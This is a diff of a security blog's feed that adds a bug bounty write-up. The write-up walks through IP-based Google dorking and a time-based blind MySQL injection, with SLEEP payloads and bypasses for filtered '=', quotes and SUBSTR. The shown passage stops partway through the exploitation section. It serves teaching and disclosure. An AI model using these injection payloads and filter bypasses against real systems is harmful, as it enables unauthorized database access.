@@ -1,4 +1,426 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-03-11T00:15:52+01:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Reflected XSS bypassing hidden input tag and auto-submit script in a form</title><link href="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/" rel="alternate" type="text/html" title="Reflected XSS bypassing hidden input tag and auto-submit script in a form" /><published>2023-12-10T00:00:00+01:00</published><updated>2023-12-10T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/12/10/reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-03-19T22:40:29+01:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">Human 1 - sqlmap 0: defeating automation through manual exploitation</title><link href="https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation/" rel="alternate" type="text/html" title="Human 1 - sqlmap 0: defeating automation through manual exploitation" /><published>2024-03-19T00:00:00+01:00</published><updated>2024-03-19T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/03/19/human-1-sqlmap-0-defeating-automation-through-manual-exploitation/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-1&quot;&gt;3.1.1. Bypassing the sanitization of the symbol =&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-2&quot;&gt;3.1.2. Bypassing the sanitization of quotes&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-3&quot;&gt;3.1.3. Bypassing the blacklisting of the SUBSTR function&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-4&quot;&gt;3.1.4. Weaponizing the payload to dump the database name&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In this post I will show the trickiest SQL injection I have ever exploited. Moreover, I have the pleasure to share this report with my friend &lt;strong&gt;&lt;a href=&quot;https://es.linkedin.com/in/bernardo-viqueira-hierro-0b882637&quot;&gt;Bernardo Viqueira Hierro&lt;/a&gt;, aka. IckoGZ&lt;/strong&gt;, who discovered the asset and the vulnerability. However, this was not enough and the company told him that he had to demonstrate an impact to win the bounty, so he had to retrieve some data from the BBDD to prove the severity of the SQL injection. Some tools like sqlmap were able to detect the vulnerability but not to exploit it, so Icko contacted me to see if I could do something, so I performed the exploitation.&lt;/p&gt;
+
+&lt;p&gt;I hope you enjoy and learn a lot from this post!&lt;/p&gt;
+
+&lt;div id=&quot;section-id-1&quot; /&gt;
+
+&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;
+
+&lt;p&gt;Icko discovered the asset through google dorking using the following tool&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://0iq.me/gip/&quot;&gt;IP Google Dorking tool&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;developed by &lt;a href=&quot;https://twitter.com/0x21SAFE&quot;&gt;0x21SAFE&lt;/a&gt;. This tool is used &lt;a href=&quot;https://twitter.com/intigriti/status/1527977514341048320?lang=en&quot;&gt;to find hidden assets by searching only IPs&lt;/a&gt; and can be useful during horizontal recon. This means that during the domain enumeration (domain1.com, domain2.es, domain3.us, …), it may also be interesting to enumerate IPs that do not have an associated domain or subdomain but belong to the company.&lt;/p&gt;
+
+&lt;p&gt;Allowing the web to open multiple tabs so that the tool can work properly and searching for one of the terms suggested by the tool&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Facebook internal assets report
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/asset-discovery-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;yields the following result&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/asset-discovery-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The tool generates several searches in different tabs using Google Dorking. The tab you see in the above capture corresponds to the following Google Dork&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(Facebook internal assets report) (site:*.*.60.* |site:*.*.59.* |site:*.*.58.* |site:*.*.57.* |site:*.*.56.* |site:*.*.55.* |site:*.*.54.* |site:*.*.53.* |site:*.*.52.* |site:*.*.51.* |site:*.*.50.* |site:*.*.49.* |site:*.*.48.* |site:*.*.47.* |site:*.*.46.* |site:*.*.45.* |site:*.*.44.* |site:*.*.43.* |site:*.*.42.* |site:*.*.41.* |site:*.*.40.* |site:*.*.39.* |site:*.*.38.* |site:*.*.37.* |site:*.*.36.* |site:*.*.35.* |site:*.*.34.* |site:*.*.33.* |site:*.*.32.* |site:*.*.31.* |site:*.*.30.* |site:*.*.29.* |site:*.*.28.* |site:*.*.27.* |site:*.*.26.* |site:*.*.25.* |site:*.*.24.* |site:*.*.23.* |site:*.*.22.* |site:*.*.21.* |site:*.*.20.* |site:*.*.19.* |site:*.*.18.* |site:*.*.17.* |site:*.*.16.* |site:*.*.15.* |site:*.*.14.* |site:*.*.13.* |site:*.*.12.* |site:*.*.11.* |site:*.*.10.* |site:*.*.9.* |site:*.*.8.* |site:*.*.7.* |site:*.*.6.* |site:*.*.5.* |site:*.*.4.* |site:*.*.3.* |site:*.*.2.* |site:*.*.1.* |site:*.*.0.* )
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This particular dork is used to search for all IPs of the form &lt;em&gt;X.X.[0-60].X&lt;/em&gt; in which the term &lt;em&gt;Facebook internal assets report&lt;/em&gt; appears. This is a partial result but joining the results of all the tabs we have the total result.&lt;/p&gt;
+
+&lt;p&gt;This tool can be useful to perform searches on terms that are very specific to the company, such as a footer. If you take the footer of a website that you know 100% that it belongs to the company and you search for it using this tool, it is likely that you will find other websites with the same footer and therefore belonging to the same company. Original recon method!&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2&quot; /&gt;
+
+&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;
+
+&lt;p&gt;As I said before, the asset was an IP with no associated domain. Icko found an IP that had several routes with different PHPs, one of them took a number as a parameter but he discovered that there was a WAF so all the tests he did were manual. He sent in that param the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and it triggered a delay of almost 5 seconds, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/vulnerability-discovery.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;During the tests I did, an input of 2 seconds in the sleep triggers a delay between 4 and 5 seconds, probably due to a network delay. Therefore we could say that the real multiplier is approximately 2, that means, an input of 2 seconds in the sleep triggers a delay of 4 seconds in the response. This happens quite often in blind SQL injections but with different multipliers.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3&quot; /&gt;
+
+&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;
+
+&lt;p&gt;The company told Icko that finding a SQLi was not enough and that he had to exploit it to win the bounty. However, tools like sqlmap were not able to return any information and the exploitation of the SQLi did not seem obvious. Now is when I enter the game :sunglasses:.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-1&quot; /&gt;
+
+&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;
+
+&lt;p&gt;Since we already got a delay and the response always had the same size and content, I thought the smartest way to extract information was &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays&quot;&gt;triggering time delays&lt;/a&gt;. This way of exploiting SQLi is difficult but I have always found it useful to extract some information from the BBDD and demonstrate that the SQLi is weaponizable. Besides, it is usually quite funny :smiley:.&lt;/p&gt;
+
+&lt;p&gt;If sqlmap is not able to retrieve any information from the database, it is because there are problems: sanitizations, keyword blacklisting… That is why the strategy to follow is to build the payload step by step making sure that all the characters, expressions, functions… are evaluated correctly by the backend.&lt;/p&gt;
+
+&lt;p&gt;The best way to do this is to evaluate boolean expressions that we know to be true and proceed as follows:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;If a delay is triggered, it means that all the characters of the expression are accepted by the backend.&lt;/li&gt;
+  &lt;li&gt;If a delay is not triggered, it means that some of the characters of the expression are sanitized or rejected by the backend.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To follow this strategy, the first thing to do is to build a request that evaluates a conditional statement. By sending the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;it returns the following response&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-conditional.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The conditional statement is working because it evaluates &lt;em&gt;1 &amp;lt; 1000&lt;/em&gt; as true and therefore triggers the delay.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-1-1&quot; /&gt;
+
+&lt;h3 id=&quot;311-bypassing-the-sanitization-of-the-symbol-&quot;&gt;3.1.1. Bypassing the sanitization of the symbol =&lt;/h3&gt;
+
+&lt;p&gt;The ultimate goal is to compare characters so it will be necessary to use a comparison operator such as &lt;em&gt;=&lt;/em&gt;. Therefore, using a payload as follows&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;should trigger a delay. However the response I got was&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-equal-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;where there was no delay.&lt;/p&gt;
+
+&lt;p&gt;All elements of the payload except the symbol &lt;em&gt;=&lt;/em&gt; have been tested successfully so the only reason for not triggering the delay must be a problem with the symbol &lt;em&gt;=&lt;/em&gt;, for example a sanitization. So… is there another way to check if two numbers or characters are the same? Yes, using the operator &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/mysql/mysql_like.asp&quot;&gt;LIKE&lt;/a&gt;&lt;/em&gt;. Thus, using the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the delay is triggered&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-equal-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-1-2&quot; /&gt;
+
+&lt;h3 id=&quot;312-bypassing-the-sanitization-of-quotes&quot;&gt;3.1.2. Bypassing the sanitization of quotes&lt;/h3&gt;
+
+&lt;p&gt;Ok, now we can check if 2 numbers are the same, but what we will want to compare in most situations are characters, so the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;should trigger a delay. However there was no delay, as you can see in the following capture&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-quote-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Again, the problem must be the new element that we have introduced in the payload, which are the single quotes (the same happens with the double quotes). How can we compare characters if we cannot use single or double quotes?&lt;/p&gt;
+
+&lt;p&gt;As we have seen, we can work with numbers and with functions, so it would be good to use a function that given a number returns a character. This way we could work with characters without having to declare them explicitly. What do you know that relates numbers and characters? In effect, the &lt;em&gt;ASCII&lt;/em&gt; code.&lt;/p&gt;
+
+&lt;p&gt;In MySQL the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_sqlserver_char.asp&quot;&gt;CHAR&lt;/a&gt;&lt;/em&gt; function returns the character associated to the &lt;em&gt;ASCII&lt;/em&gt; code given as a parameter. For example, the character &lt;em&gt;a&lt;/em&gt; has &lt;em&gt;ASCII&lt;/em&gt; code 97, so the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;should cause a delay, and the response was&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-sanit-quote-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, a delay is triggered, so the &lt;em&gt;CHAR&lt;/em&gt; function was executed successfully.&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/mathematics.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-1-3&quot; /&gt;
+
+&lt;h3 id=&quot;313-bypassing-the-blacklisting-of-the-substr-function&quot;&gt;3.1.3. Bypassing the blacklisting of the SUBSTR function&lt;/h3&gt;
+
+&lt;p&gt;To extract information from a BBDD exploiting a SQLi, the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_substr.asp&quot;&gt;SUBSTR&lt;/a&gt;&lt;/em&gt; function is usually used to guess by brute force the value of each string, character by character. Therefore it is necessary to verify that this function works correctly.&lt;/p&gt;
+
+&lt;p&gt;To test this function it is necessary to use a string as input, but as I said before, we cannot declare strings. For this reason I tried to use the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_version.asp&quot;&gt;VERSION&lt;/a&gt;&lt;/em&gt; function, that during the tests I verified that it worked correctly. This function returns the version of the MySQL installed and can be useful to check that the &lt;em&gt;SUBSTR&lt;/em&gt; function works correctly. However the following payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUBSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;did not trigger a delay for any value of &lt;em&gt;i = 48, 1, …, 57&lt;/em&gt; (the &lt;em&gt;ASCII&lt;/em&gt; codes of 0, 1, …, 9). Again, considering that the &lt;em&gt;VERSION&lt;/em&gt; function works correctly, there is no other option than that the &lt;em&gt;SUBSTR&lt;/em&gt; function is blacklisted or not available because the first character of the version must be an integer between 0 and 9.&lt;/p&gt;
+
+&lt;p&gt;Here I thought I had a problem. However, after many tests I realized that there were some functions that worked, others that didn’t… in a seemingly random way. On the other hand, in programming languages it is quite common that a function can be rewritten in function of the others, so maybe it is possible to simulate the &lt;em&gt;SUBSTR&lt;/em&gt; function by composing other available functions. Searching in Google for MySQL functions to work with strings, I found the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/mysql/func_mysql_left.asp&quot;&gt;LEFT&lt;/a&gt;&lt;/em&gt; and &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/MYSQL/func_mysql_right.asp&quot;&gt;RIGHT&lt;/a&gt;&lt;/em&gt; functions.&lt;/p&gt;
+
+&lt;p&gt;After testing some payloads I found that although the &lt;em&gt;SUBSTR&lt;/em&gt; function did not work, the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions were available, so after racking my brain for a long time I discovered that the following formula is satisfied:&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i-th letter of the string of the variable input = SUBSTR(input, i, 1) = RIGHT(LEFT(input, i), 1) for i = 1, ..., LENGTH(input)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By reading the specifications of the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions you will see that it makes sense. You can also check it by executing the following SQL code&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy
+  &lt;/button&gt;
+&lt;/div&gt;
+
